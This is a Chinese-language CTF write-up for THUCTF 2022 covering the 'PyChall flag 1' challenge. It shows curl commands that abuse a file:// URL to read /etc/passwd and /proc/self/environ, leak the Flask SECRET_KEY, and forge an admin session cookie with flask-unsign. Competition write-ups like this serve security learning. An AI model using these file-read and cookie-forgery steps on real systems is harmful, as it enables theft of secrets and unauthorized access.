#+title: THUCTF 2022 Writeup
#+author: nft_tables

#+LATEX_CLASS: ctexart
#+LATEX_CLASS_OPTIONS: [fontset=none]
#+LATEX_COMPILER: xelatex
#+LATEX_HEADER: \setCJKmainfont{Noto Serif CJK SC}
#+LATEX_HEADER: \setCJKsansfont{Noto Sans CJK SC}
#+LATEX_HEADER: \setCJKmonofont{Sarasa Fixed Slab SC}
#+LATEX_HEADER: \setmonofont{Iosevka Slab}[Contextuals=Alternate]
#+LATEX_HEADER: \newfontfamily\mma{Iosevka Slab}[RawFeature=-calt;+WFLM, NFSSFamily=MMAFamily]

#+LATEX: \clearpage

本次比赛单人组队，作为一次“现场学习能力大赛”，通过网上到处学习，计解出题目 23 道，
总分 7618。以下简要按题目的分类给出本人解题的思路，附录中则辑录了使用的所有脚本
代码以及赛场上被证明是失败的一些尝试。本文的代码由 Org-mode 生成，可以在
https://github.com/OceanS2000/THUCTF-2022-Writeup 上查看。

** PyChall flag 1
=12 solves, 435 pts=

从名字和 =Server: Werkzeug/2.2.2 Python/3.10.7= 推断，可能是一个 Flask 程序。于
是尝试对返回的 cookie 进行解码
#+begin_src bash
$ flask-unsign --decode \
   --cookie=eyJpc0FkbWluIjowLCJ1c2VybmFtZSI6IicifQ.YzVi7g.86cQ9pDVtbGkke8FpmBsQCLpIs8
{'isAdmin': 0, 'username': "'"}
#+end_src
推断目标是泄漏私钥使得我们可以修改 =isAdmin= 的值。

首先看到登录框会影响登录后页面，尝试 SSTI 后发现不成功。

然后将目标放到请求框上来，发现其能通过 =file:= 来访问本机任意文件
#+begin_src bash
$ curl -b session=... \
   'http://nc.thuctf.redbud.info:32088/download/' \
   -F url='file:///etc/passwd'
请求结果：
root:x:0:0:root:/root:/bin/bash
# ...
#+end_src

于是尝试访问 =/proc/self/cmdline= 确定文件名是 =app.py= ，但是在尝试读取时发现
#+begin_src bash
$ curl -b session=... \
   'http://nc.thuctf.redbud.info:32088/download/' \
   -F url='file:///proc/self/cwd/app.py'
页面内容含有非法字符！%
#+end_src
看来可能有奇怪的过滤，再尝试 =/proc/self/environ=
#+begin_src bash
$ curl -b session=... \
   'http://nc.thuctf.redbud.info:32088/download/' \
   -F url='file:///proc/self/environ' | xargs -0 -n 1
# ...
SECRET_KEY=74a832d6-c6ef-485c-a09c-3f1c38221674
# ...
#+end_src

于是立刻可以使用 =flask-unsign= 获得我们想要的 cookie
#+begin_src bash
flask-unsign --secret '74a832d6-c6ef-485c-a09c-3f1c38221674' \
    --sign --cookie "{\"isAdmin\" : 1, \"username\" : \"'\" }"
eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6IicifQ.YzvvTQ.yG5D3j33LD6ae3xJ0Z8G9AKFnt0
#+end_src

之后再访问 =/flag= 即可。
#+begin_src bash
curl -b session='eyJpc0FkbWluIjoxLCJ1c2VybmFtZSI6IicifQ.YzvvTQ.yG5D3j33LD6ae3xJ0Z8G9AKFnt0' \
    'http://nc.thuctf.redbud.info:32088/flag'
#+end_src

#+RESULTS:
: Here is your flag: THUCTF{Congratu1ate!Now-try-to-RCEeeee!@}

